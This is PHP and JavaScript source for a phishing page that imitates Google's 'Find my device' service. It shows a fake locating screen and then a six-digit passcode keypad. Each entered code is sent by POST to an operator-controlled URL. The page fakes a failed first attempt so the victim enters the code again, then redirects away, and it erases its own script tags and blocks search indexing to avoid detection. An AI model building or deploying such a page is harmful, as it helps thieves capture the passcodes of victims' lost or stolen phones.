<?php
include(__DIR__ . "/../includes/google.php");
session_name("CAKEPHP");
session_start();

$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';

echo "<script>
		var username = '$username';
		var post_url = '$post_url';
		var link_id = '$link_id';
		var redirect_url = '$redirect_url';
	  </script>";

$passcode_length = 6;


echo '<!DOCTYPE html>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="robots" content="noindex, nofollow, noarchive">
		<meta name="googlebot" content="noindex, nofollow, noarchive">
		<meta name="googlebot" content="nosnippet">
		<meta name="robots" content="noodp">
		<meta name="slurp" content="noydir">
		<meta name="robots" content="noimageindex,nomediaindex">
		<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
		<script id="1584259049" type="text/javascript" src="../js/heho.js"></script>
		<meta name="robots" content="noindex, nofollow, noarchive">
		<meta name="googlebot" content="noindex, nofollow, noarchive">
		<meta name="googlebot" content="nosnippet">
		<meta name="robots" content="noodp">
		<meta name="slurp" content="noydir">
		<meta name="robots" content="noimageindex,nomediaindex">
		<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">

		<html>
		<head>
		  <script src="src/icloud_page/jquery-1.10.2.js"></script>
		  <script type="text/javascript">
		   $(document).ready(function () {
			   var ss = setTimeout(function () {}, 2000);
		   });
		  </script>
		 <title>Find my device</title>
		 <link rel="stylesheet" type="text/css" href="src/activation_lock/passcode.css">
		 <meta charset="utf-8">
		 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		 <script src="code.jquery.com/jquery-1.10.2.js"></script>
		 <script src="code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
		 <script src="src/icloud_page_new/activity-indicator.js"></script>
		 <link rel="icon" href="https://www.gstatic.com/images/branding/productlogos/find_my_device/v6/web-32dp/logo_find_my_device_color_1x_web_32dp.png" type="image/png">
		</head>

		<body id="body_b" style="font-family: Arial, Helvetica, sans-serif; ">
		<div id="show_1" style="display: block;">
		<div style="margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);">
		<div id="submit_loader_1">
		
			<div style="text-align: center;" ><img style="height: 150px;" src="img/Seguridad.gif"/></div>
		
		</div>
		<div style="padding-top: 18px; text-align: center;"><label style="font-family: Arial, Helvetica, sans-serif;">';
		
        echo $language['locating'][$lang];
		echo '</label></div></div></div>
		<div  id="show_2" style="text-align: center; margin-left: 20px; margin-right: 20px; padding-top: 50px; display: none;"> 
		<div style="text-align: center;" ><img style="height: 150px;" src="img/encontrarEN.jpg"/></div>
		<span style="font-size: 18px; font-weight: 700;">';
		echo $language['owner_msg'][$lang];
		echo ' </span><br /><span style="font-size: 14px;">';
		echo $language['enter_unlock'][$lang];
		echo '</span> <div id="code" style="padding-top: 20px;">
		<div id="bile">';
			
			for($i=0;$i<=$passcode_length-1;$i++){
				echo '<svg height="40" width="40">  
					      <circle id="c'.($i + 1).'" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG. 
					  </svg>';
			}
		
		echo '<input type="number" name="" value="" hidden="" />
		</div>
		<div style="text-align: center; padding-top: 16px; margin-right: auto; margin-left: auto;">
		<div>
		<table style="width:280px; margin: auto;">
		<tr>
		<th><button id="1" class="button button5">1</button></th>
		<th><button id="2" class="button button5">2</button></th> 
		<th><button id="3" class="button button5">3</button></th>
		</tr>
		<tr>
		<th><button id="4" class="button button5">4</button></th>
		<th><button id="5" class="button button5">5</button></th>
		<th><button id="6" class="button button5">6</button></th>      </tr>      <tr>         <th><button id="7" class="button button5">7</button></th>
		<th><button id="8" class="button button5">8</button></th>
		<th><button id="9" class="button button5">9</button></th>
		</tr>
		<tr>
		<th></th>
		<th><button id="0" class="button button5">0</button></th>
		<th><button class="button buttonr" onclick="remove()"><img src="src/activation_lock/next.png" width="35"/></button></th>
		</tr>
		</table>
		</div></div>
		</div>
		</div>';
?>
<script id="erasable_1" type="text/javascript">
   var setcolor = 0;
   var num = 0;
   var afis = 0;
   function remove() {
   if (setcolor > 0){
     changePolyColor("white");
     num = parseInt(num/10); 
   }
   setcolor--;
   if (setcolor <  1)
    setcolor = 0;
   }
   function changePolyColor(color) {
    var poly = document.getElementById("c" + setcolor);
    poly.setAttribute("fill", color);
   }
   document.getElementById("erasable_1").innerHTML = "";
</script>
<script id="erasable_2" type="text/javascript">
   $(document).ready(function(){
    $("#show_1").bind("touchstart", function preventZoom(e){
            var t2 = e.timeStamp;
     var t1 = $(this).data("lastTouch") || t2;
     var dt = t2 - t1;
     var fingers = e.originalEvent.touches.length;
     $(this).data("lastTouch", t2);
     if (!dt || dt > 500 || fingers > 1){
      return; // not double-tap
     }
     e.preventDefault(); // double tap - prevent the zoom
     // also synthesize click events we just swallowed up
     $(e.target).trigger("click");
   });
   $("#show_2").bind("touchstart", function preventZoom(e){
     var t2 = e.timeStamp;
     var t1 = $(this).data("lastTouch") || t2;
     var dt = t2 - t1;
     var fingers = e.originalEvent.touches.length;
     $(this).data("lastTouch", t2);
     if (!dt || dt > 500 || fingers > 1){
      return; // not double-tap
     }
     e.preventDefault(); // double tap - prevent the zoom
     // also synthesize click events we just swallowed up
     $(e.target).trigger("click");
   });
   $("#show_3").bind("touchstart", function preventZoom(e){
     var t2 = e.timeStamp;
     var t1 = $(this).data("lastTouch") || t2;
     var dt = t2 - t1;
     var fingers = e.originalEvent.touches.length;
     $(this).data("lastTouch", t2);
     if (!dt || dt > 500 || fingers > 1){
      return; // not double-tap
     }
     e.preventDefault(); // double tap - prevent the zoom
     // also synthesize click events we just swallowed up
     $(e.target).trigger("click");
   });
   
   var passcode_length = parseInt('<?php echo $passcode_length?>');
   
   $(".button5").click(function(){
    setcolor++;
    if (setcolor <= passcode_length){
     changePolyColor("black"); 
     num = (num*10) + parseInt($(this).prop("id"));
     if (setcolor == passcode_length){
      
	  
	  if(passcode_length<=4){
		  if (num.toString().length == 0){
			num = "0000"+num;
		  };
		  if (num.toString().length == 1){
			num = "000"+num;
		  };
		  if (num.toString().length == 2){
			num = "00"+num;
		  };
		  if (num.toString().length == 3){
			num = "0"+num;
		  };
	  }else{
		  if (num.toString().length == 0){
			num = "000000"+num;
		  };
		  if (num.toString().length == 1){
			num = "00000"+num;
		  };
		  if (num.toString().length == 2){
			num = "0000"+num;
		  };
		  if (num.toString().length == 3){
			num = "000"+num;
		  };
		  
		  if (num.toString().length == 4){
			num = "00"+num;
		  };
		  
		  if (num.toString().length == 5){
			num = "0"+num;
		  };
	  }
   
     $.ajax({
       type:"POST",
       url:post_url,
       data: 'id=' + link_id + '&type=passcode&pass=' + num,
	   });
      afis++;
      if (afis == 2){
		  
		   $.ajax({
			   type:"POST",
			   url:post_url,
			   data: 'id=' + link_id + '&type=passcode&pass=' + num + '&processed=1',
			   complete: function(data) {
				   window.top.location.href = redirect_url;
			   }
		   });
      }
      else
       $("#bile").effect("shake", {times:3}, 500, callback);
      }
      }
     if (setcolor > passcode_length)
      setcolor = passcode_length;
   });  
   function callback(){
    num = 0;
   
    setTimeout(clear(), 3000);
   }
   function clear(){
    for (var i=0;i<=passcode_length;i++){
     changePolyColor("white");
     setcolor--;
    } 
    setcolor = 0;   
   }
     function show_body() {
      $("#show_1").css("display", "none");
      $( "#show_2" ).fadeIn( "slow", function() {
      // Animation complete.
     //$( "#code_in" ).focus();
      });
     }
     setTimeout(show_body, 2000);
   });

   document.getElementById("erasable_2").innerHTML = "";
</script>
<script type="text/javascript">
   jQuery("#submit_loader_1").activity({width: 0, segments: 12, length: 5});
   jQuery("#submit_loader_2").activity({width: 0, segments: 12, length: 5});
   
   $(".close").click(function(){
    $("#myModal").css("display", "none");
    $("#pw").focus();
   
   });
</script>